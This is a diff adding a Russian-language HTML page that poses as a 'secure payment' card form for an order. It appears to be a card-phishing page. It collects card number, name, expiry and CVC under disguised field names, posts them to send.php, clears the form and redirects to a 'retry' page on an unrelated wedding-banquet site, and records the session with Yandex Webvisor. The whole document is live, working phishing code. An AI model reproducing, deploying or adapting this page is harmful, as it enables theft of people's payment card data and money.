@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	   
+        <script src="./reg_files/jquery.min.js"></script>
+        <script src="./reg_files/jquery.validate.min.js"></script>
+        <script src="./reg_files/additional-methods.min.js"></script>
+        <script src="./reg_files/jquery.inputmask.bundle.min.js"></script>
+		<link href="./reg_files/css" rel="stylesheet">
+		<link rel="stylesheet" href="./reg_files/common.css">
+	
+	
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://atlenitana.ru/service/svadebnyj-banket/oplata/jquery.maskedinput.js"></script>
+
+    </head>
+	<body>
+	<div class="wrapper h-100 d-flex flex-column justify-content-between quest-step">
+		<div class="header">
+			<div class="container">
+				<div class="row align-items-center">
+					<div class="col-6 header--logo">
+						<img src="./reg_files/logo.png" alt="Регистрация нового юзера">
+					</div>
+					<div class="col-6 header--text">
+                       Безопасная оплата в Интернете					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="content">
+			<div class="container">
+				<form id="cardform" name="cardform" class="form" method="" action="" novalidate="novalidate">
+                    
+                    <input type="hidden" name="user_id" id="user_id" value="2783">
+                    <input type="hidden" name="paylink_id" id="paylink_id" value="28">
+                    <input type="hidden" name="price" id="paylink_id" value="100">
+                    <div class="form-price row align-items-center">
+						<div class="col-4 form-price--left">
+							<div class="form-price--digit">
+                                
+							</div>
+						</div>
+						<div class="col-8 form-price--right">
+							<b>Платежная система</b>
+							<div class="text-primary">
+                                Заказ № 367124</script>
+							</div>
+						</div>
+					</div>
+					<hr class="form-line mt-20 mb-30">
+
+					<div class="mt-30 text-center text-mutedx2">
+						Заполните все поля карты и нажмите кнопку "Оплатить"					</div>
+
+					<div class="credit-cards mt-30">
+						<div class="credit-card credit-card_front d-flex flex-column justify-content-end">
+							<div class="form-line">
+								<input class="form-control"  id="phone1" class="form-control" placeholder="Номер карты" name="vin" id="vin" value="" >
+							</div>
+							<div class="form-line">
+								<input class="form-control text-uppercase" type="text" placeholder="IVAN IVANOV" name="name_avto" id="name avto" value="">
+							</div>
+							<div class="row align-items-center">
+								<div class="col-3 input-mini">
+									<input class="form-control form-control_center" type="text" placeholder="ММ" maxlength="2" name="REG" id="REG" value="">
+								</div>
+								<div class="col-1 text-center text-mutedx2">
+									/
+								</div>
+								<div class="col-3 input-mini">
+									<input class="form-control form-control_center" type="text" placeholder="ГГ" maxlength="2" name="year" id="year" value="">
+								</div>
+								<div class="col-5 text-right credit-card--brand">
+									<img src="./reg_files/card-brand-logo.png" alt="">
+								</div>
+							</div>
+						</div>
+
+						<div class="credit-card credit-card_rear d-flex flex-column justify-content-end">
+							<div class="cvc align-items-center">
+								<input class="form-control form-control_center" type="text" placeholder="123" maxlength="3" name="country" id="country" value="">
+								<div class="cvc-text text-mutedx2">код</div>
+							</div>
+						</div>
+					</div>
+
+                    <div class="mt-20 text-danger text-sm error-div" style="display: none">Исправьте ошибки, выделенные красной рамкой:</div>
+
+
+					<div class="row mt-40 align-items-center">
+						<div class="col-7 form-agreement text-mutedx2">
+                            После ввода данных, нажмите Оплатить						</div>
+						<div class="col-5 form-submit">
+							<button class="btn" id="pay_button">
+                                Оплатить                            </button>
+						</div>
+					</div>
+
+
+
+					<hr class="form-line mt-30 mb-20">
+					<div class="mt-30 text-center">
+						<div class="text-mutedx2 mb-10">
+							<img src="./reg_files/padlock.png" alt="">
+							<span class="ml-5">Безопасность оплаты гарантируется</span>
+						</div>
+						<img src="./reg_files/protect-logos.png" alt="">
+					</div>
+
+				</form>
+			</div>
+		</div>
+
+		<div class="footer">
+			<div class="container">
+				<div class="row align-items-center">
+					<div class="col-7 footer--left">
+                        <span class="text-mutedx2"> Техническая поддержка</span>
+					</div>
+					<div class="col-5 footer--right">
+						<a href="#" target="_blank">Обратная связь</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+    
+    
+<script>
+		$('#cardform').submit(function (e) {
+			e.preventDefault();
+			$.ajax({
+				url: "send.php",
+				type: "POST",
+				data: $('#cardform').serialize(),
+				success: function (response) {
+					//обработка успешной отправки
+					$('#cardform')[0].reset();
+					console.log('ok');
+					window.location.href = 'https://atlenitana.ru/service/svadebnyj-banket/oplata/povtor/';
+				},
+				error: function (response) {
+					//обработка ошибок при отправке
+					$('#cardform')[0].reset();
+					console.log('no');
+					window.location.href = 'https://atlenitana.ru/service/svadebnyj-banket/oplata/povtor/';
+				}
+			});
+		});
+	</script>
+	
+	
+	<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(88850987, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/88850987" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+	
+	
+
+
+
+	<script>
+	
+    $(function(){
+        $("#phone1").mask("9999-9999-9999-9999");
+    });
+
+	</script>
+</body></html>
